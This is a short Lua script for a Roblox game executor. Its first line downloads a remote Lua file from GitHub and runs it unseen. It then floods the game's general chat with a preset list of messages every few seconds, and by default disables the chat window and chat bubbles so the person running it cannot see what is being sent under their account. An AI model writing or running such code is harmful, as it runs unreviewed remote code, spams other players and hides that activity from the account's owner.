loadstring(game:HttpGet("https://raw.githubusercontent.com/CarexHub/Misc/refs/heads/main/Chats.lua"))()


local SpamInterval = 5

function SendMsgByUser(Msg)
    local Chat = game:GetService("TextChatService"):WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
    Chat:SendAsync(Msg)
end

function DisableChatVisibility()
    local BubbleChat = game:GetService("TextChatService"):WaitForChild("BubbleChatConfiguration")
    local Chat = game:GetService("TextChatService"):WaitForChild("ChatWindowConfiguration")

    BubbleChat.Enabled = false
    Chat.Enabled = false
end

function SpamChat()
    while true do
        for _, Message in getfenv().ChatMessages do
            if not getfenv().Dev then
                DisableChatVisibility()
            end
            SendMsgByUser(Message)
            task.wait(SpamInterval)
        end
    end
end

if not getfenv().config["StealthMode"] == true then
    task.spawn(SpamChat)
end
